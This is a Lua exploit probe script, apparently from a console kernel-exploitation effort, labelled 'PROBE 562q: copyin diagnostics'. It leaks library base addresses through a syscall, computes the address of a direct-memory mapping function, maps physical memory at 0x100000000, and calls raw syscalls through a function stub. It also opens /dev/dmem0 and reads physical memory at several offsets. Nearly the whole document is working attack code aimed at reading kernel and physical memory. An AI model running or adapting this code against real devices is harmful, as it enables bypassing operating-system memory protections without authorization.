-- CRASH_CLASS: LOW
-- PROBE 562q: Diagnose write/copyin from different memory sources
--
-- 562p: fn_addr write(1, mapped_va, 256) = -1 (EFAULT?). No crash.
-- Need to know:
-- (1) Does write(1, heap, N) work at all via fn_addr? → isolate MapDM issue
-- (2) Can we pread()/read() from /dev/dmem0 at kernel phys offsets?
-- (3) Does writev or sendmsg work for MapDM addresses?

print("=== PROBE 562q: COPYIN DIAGNOSTICS ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rb(a)
    local d = rd(a); if d == nil then return nil end
    if d < 0 then d = d + 0x100000000 end; return d
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local Z = uint64(0)
local sc477 = mk(477)
local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(Z, ib) end)
local elo = rd(N(ib) + 0x108) or 0; local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end

wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib) end)
local llo = rd(N(ib) + 0x108) or 0; local lhi = rd(N(ib) + 0x10C) or 0
if llo < 0 then llo = llo + 0x100000000 end
if lhi < 0 then lhi = lhi + 0x100000000 end
local lk = uint64(string.format("0x%X%08X", lhi, llo))
local mapdm_fn = lk + uint64(0x15020)

print(string.format("eb=0x%X%08X lk=0x%X%08X", ehi, elo, lhi, llo))
io.flush()

-- ============================================================
-- [A] Test write(1, heap_buf, 16) via fn_addr BEFORE MapDM
-- ============================================================
print("[A] write(1) from heap BEFORE MapDM")
local heap_buf = memory.alloc(64)
wq(N(heap_buf), uint64("0xAAAAAAAABBBBBBBB"))
wq(N(heap_buf) + 8, uint64("0xCCCCCCCCDDDDDDDD"))
print("HEAP_WRITE_START")
io.flush()
local ok_w1, rv_w1 = pcall(function()
    return native.fcall_with_rax(stub, 4,
        uint64(1), heap_buf, uint64(16))
end)
io.flush()
print("")
print("HEAP_WRITE_END")
print(string.format("write(heap) rv=%s", ok_w1 and N(rv_w1) or "CRASH"))
io.flush()

-- ============================================================
-- [B] MapDM phys 0x100000000
-- ============================================================
print("")
print("[B] MapDM phys 0x100000000")
local mapped_va = uint64("0x880000000")
pcall(function()
    sc477(mapped_va, uint64(0x4000), uint64(3),
        uint64(0x1012), uint64(0xFFFFFFFF), Z)
end)
local ok_md, rv_md = pcall(function()
    return native.fcall_with_rax(mapdm_fn, 0,
        mapped_va, uint64(0x4000), uint64(3), Z,
        uint64("0x100000000"), uint64(0x4000))
end)
print("MapDM rv=" .. (ok_md and N(rv_md) or -999))
io.flush()

-- ============================================================
-- [C] Test write(1, heap_buf, 16) AFTER MapDM — fn_addr still works?
-- ============================================================
print("")
print("[C] write(1) from heap AFTER MapDM")
wq(N(heap_buf), uint64("0x1111111122222222"))
wq(N(heap_buf) + 8, uint64("0x3333333344444444"))
print("HEAP_POST_START")
io.flush()
local ok_w2, rv_w2 = pcall(function()
    return native.fcall_with_rax(stub, 4,
        uint64(1), heap_buf, uint64(16))
end)
io.flush()
print("")
print("HEAP_POST_END")
print(string.format("write(heap_post) rv=%s", ok_w2 and N(rv_w2) or "CRASH"))
io.flush()

-- ============================================================
-- [D] Test write(1, mapped_va) — copyin from MapDM'd page
-- ============================================================
print("")
print("[D] write(1, mapped_va, 64)")
print("MAPDM_WRITE_START")
io.flush()
local ok_w3, rv_w3 = pcall(function()
    return native.fcall_with_rax(stub, 4,
        uint64(1), mapped_va, uint64(64))
end)
io.flush()
print("")
print("MAPDM_WRITE_END")
print(string.format("write(mapped_va) rv=%s", ok_w3 and N(rv_w3) or "CRASH"))
io.flush()

-- ============================================================
-- [E] Test write(1, mmap_page) — copyin from regular mmap'd page
-- ============================================================
print("")
print("[E] write(1, mmap_page, 16)")
local mmap_page = uint64("0x700000000")
pcall(function()
    sc477(mmap_page, uint64(0x4000), uint64(3),
        uint64(0x1012), uint64(0xFFFFFFFF), Z)
end)
-- Write known data via memory.write
wq(N(mmap_page), uint64("0xEEEEEEEEFFFFFFFF"))
wq(N(mmap_page) + 8, uint64("0xAA55AA5500FF00FF"))
print("MMAP_WRITE_START")
io.flush()
local ok_w4, rv_w4 = pcall(function()
    return native.fcall_with_rax(stub, 4,
        uint64(1), mmap_page, uint64(16))
end)
io.flush()
print("")
print("MMAP_WRITE_END")
print(string.format("write(mmap) rv=%s", ok_w4 and N(rv_w4) or "CRASH"))
io.flush()

-- ============================================================
-- [F] Try pread from /dev/dmem0 at various offsets
-- ============================================================
print("")
print("[F] Open /dev/dmem0 and pread")
-- open("/dev/dmem0", O_RDWR) = sys 5
local dmem_path = memory.alloc(32)
local dp = N(dmem_path)
-- Write "/dev/dmem0\0"
wd(dp, 0x7665642F)      -- /dev
wd(dp + 4, 0x656D642F)  -- /dme
wd(dp + 8, 0x0030)      -- m0\0

local ok_open, fd_dmem = pcall(function()
    return native.fcall_with_rax(stub, 5,
        dmem_path, uint64(2))  -- O_RDWR=2
end)
print(string.format("dmem0 fd=%s", ok_open and N(fd_dmem) or "FAIL"))

if ok_open and N(fd_dmem) >= 0 then
    local fd = N(fd_dmem)
    local read_buf = memory.alloc(256)

    -- pread(fd, buf, 64, offset) = sys 475
    local offsets = {0, 0x1000, 0x10000, 0x100000, 0x1000000}
    for _, off in ipairs(offsets) do
        for i = 0, 252, 4 do wd(N(read_buf) + i, 0) end
        local ok_pr, rv_pr = pcall(function()
            return native.fcall_with_rax(stub, 475,
                uint64(fd), read_buf, uint64(64), uint64(off))
        end)
        local rv = ok_pr and N(rv_pr) or -999
        print(string.format("  pread(dmem0, 64, 0x%X) rv=%d", off, rv))
        if rv > 0 then
            local v0 = rb(N(read_buf)) or 0
            local v1 = rb(N(read_buf) + 4) or 0
            print(string.format("    [0..7] = 0x%08X_%08X", v1, v0))
        end
    end

    -- close
    pcall(function() native.fcall_with_rax(stub, 6, uint64(fd)) end)
end
io.flush()

-- ============================================================
-- [G] Alive
-- ============================================================
print("")
local pid2 = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid2 .. (pid2 == pid_val and " ALIVE" or " DEAD"))
print("=== 562q DONE ===")
